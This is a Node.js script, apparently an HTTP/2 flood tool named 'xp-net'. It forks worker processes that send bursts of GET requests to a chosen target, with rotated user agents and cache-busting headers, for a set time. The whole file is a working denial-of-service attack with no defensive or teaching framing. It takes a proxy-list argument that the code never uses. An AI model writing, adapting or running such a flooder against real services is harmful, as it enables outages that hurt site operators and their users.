// xp-net optimized by @Dimzxzzx

const http2 = require('http2');
const cluster = require('cluster');
const { URL } = require('url');

if (process.argv.length !== 8) {
  console.log('Usage: node xp-net.js <target> <port> <time> <rate> <threads> <proxy.txt>');
  process.exit(1);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]) * 1000;
const rate = parseInt(process.argv[5]); 
const threads = parseInt(process.argv[6]);

const parsed = new URL(`${target.startsWith('http') ? '' : 'https://'}${target}`);

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:125.0) Gecko/20100101 Firefox/125.0'
];

function randomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function startAttack() {
  const client = http2.connect(parsed.origin, {
    settings: {
      enablePush: false,
      maxConcurrentStreams: 100,
    }
  });

  client.on('error', () => {});
  client.on('close', () => {});
  client.on('timeout', () => client.close());

  const endTime = Date.now() + time;

  while (Date.now() < endTime) {
    for (let i = 0; i < rate; i++) {
      try {
        const headers = {
          ':method': 'GET',
          ':path': parsed.pathname || '/',
          'user-agent': randomUA(),
          'accept': '/',
          'accept-encoding': 'gzip, deflate',
          'cache-control': 'no-cache',
          'pragma': 'no-cache'
        };

        const req = client.request(headers);
        req.on('error', () => {});
        req.on('response', () => {});
        req.on('data', () => {});
      } catch (e) {}
    }

    await delay(300); 
  }

  client.close();
}

if (cluster.isMaster) {
  console.log(`[+] xp-hold.js ${target} | Threads: ${threads} | Rate: ${rate} req/cycle | Time: ${time / 1000}s`);
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => {
    console.log('[!] XP-HOLD Finished.');
    process.exit(0);
  }, time);
} else {
  startAttack();
}